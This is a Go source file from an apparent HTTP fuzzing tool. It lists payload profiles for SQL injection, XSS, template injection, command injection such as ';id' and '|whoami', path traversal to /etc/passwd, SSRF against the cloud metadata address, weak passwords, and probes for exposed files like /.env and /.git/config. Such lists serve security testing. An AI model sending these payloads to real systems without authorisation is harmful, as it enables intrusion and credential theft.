package loop_http_fuzz

import "strings"

var payloadProfiles = map[string][]string{
	"sqli_basic": {
		"'",
		"\"",
		"1 OR 1=1",
		"' OR '1'='1",
		"1' AND '1'='2",
	},
	"sqli_boolean": {
		"1 AND 1=1",
		"1 AND 1=2",
		"' AND '1'='1",
		"' AND '1'='2",
	},
	"sqli_time": {
		"1' AND SLEEP(5)--",
		"1));WAITFOR DELAY '0:0:5'--",
	},
	"xss_html": {
		"<script>alert(1)</script>",
		"'><img src=x onerror=alert(1)>",
		"<svg/onload=alert(1)>",
	},
	"xss_attr": {
		"\" onmouseover=alert(1) x=\"",
		"' autofocus onfocus=alert(1) x='",
	},
	"ssti_basic": {
		"{{7*7}}",
		"${7*7}",
		"<%= 7*7 %>",
	},
	"cmdi_basic": {
		";id",
		"|whoami",
		"&&sleep 5",
	},
	"traversal_basic": {
		"../etc/passwd",
		"..\\..\\windows\\win.ini",
	},
	"traversal_encoded": {
		"..%2fetc%2fpasswd",
		"..%252fetc%252fpasswd",
	},
	"ssrf_basic": {
		"http://127.0.0.1/",
		"http://169.254.169.254/latest/meta-data/",
		"http://localhost/admin",
	},
	"weakpass_basic": {
		"admin",
		"root",
		"test",
		"admin123",
		"123456",
	},
	"auth_bypass_basic": {
		"",
		"Bearer invalid",
		"null",
	},
	"id_enum_numeric": {
		"1",
		"2",
		"3",
		"10",
		"{{int(1-5)}}",
	},
	"id_enum_zero_padded": {
		"{{int(1-20|4)}}",
	},
	"debug_leak_probe": {
		"/swagger",
		"/swagger.json",
		"/openapi.json",
		"/actuator",
		"/.git/config",
		"/.env",
		"/backup.zip",
	},
}

func payloadsForProfile(name string) []string {
	return append([]string(nil), payloadProfiles[strings.TrimSpace(name)]...)
}
